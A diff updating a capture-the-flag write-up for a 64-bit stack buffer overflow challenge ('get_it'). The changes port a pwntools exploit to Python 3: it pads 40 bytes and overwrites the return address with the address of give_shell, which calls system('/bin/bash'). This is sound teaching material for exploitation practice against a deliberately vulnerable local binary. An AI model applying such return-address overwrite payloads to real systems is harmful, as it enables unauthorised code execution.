@@ -84,7 +84,7 @@ gef➤  search-pattern 15935728
   0x7fffffffde70 - 0x7fffffffde78  →   "15935728"
 ```
 
-So we can see that the return address i stored at `0x7fffffffde98`. Our input begins at `0x7fffffffde70`. This gives us a `0x7fffffffde98 - 0x7fffffffde70 = 0x28` byte offset (`0x28 = 40`). So we just have to write `40` bytes worth of input and we can write over the return address. That address will be executed when the `ret` instruction is executed, giving us code execution. The question is now what do we want to execute? Looking through the list of functions in Ghidra, we see that there is a `give_shell` function:
+So we can see that the return address is stored at `0x7fffffffde98`. Our input begins at `0x7fffffffde70`. This gives us a `0x7fffffffde98 - 0x7fffffffde70 = 0x28` byte offset (`0x28 = 40`). So we just have to write `40` bytes worth of input and we can write over the return address. That address will be executed when the `ret` instruction is executed, giving us code execution. The question is now what do we want to execute? Looking through the list of functions in Ghidra, we see that there is a `give_shell` function:
 
 ```
 void give_shell(void)
@@ -101,10 +101,10 @@ This function looks like it just gives us a shell by calling `system("/bin/bash"
 from pwn import *
 
 target = process("./get_it")
-#gdb.attach(target, gdbscript = 'b *0x4005f1')
+gdb.attach(target, gdbscript = 'b *0x4005f1')
 
-payload = ""
-payload += "0"*40 # Padding to the return address
+payload = b""
+payload += b"0"*40 # Padding to the return address
 payload += p64(0x4005b6) # Address of give_shell in least endian, will be new saved return address
 
 # Send the payload
@@ -114,9 +114,9 @@ target.sendline(payload)
 target.interactive()
 ```
 
-When we run it:
+When we run it, we see the below text. This might crash on the `system("/bin/bash")` if you are running it on a more modern version of Ubuntu. If it does, ignore it and move on, consider this challenge solved (as long as you are successfully calling the `give_shell` function). This is because the challenge was made to run in a different environment/libc version, and exploitation techniques that work one way in one environment work differently in others:
 ```
-$    python exploit.py
+$    python3 exploit.py
 [+] Starting local process './get_it': pid 2969
 [*] running in new terminal: /usr/bin/gdb -q  "./get_it" 2969 -x "/tmp/pwndObRhj.gdb"
 [+] Waiting for debugger: Done
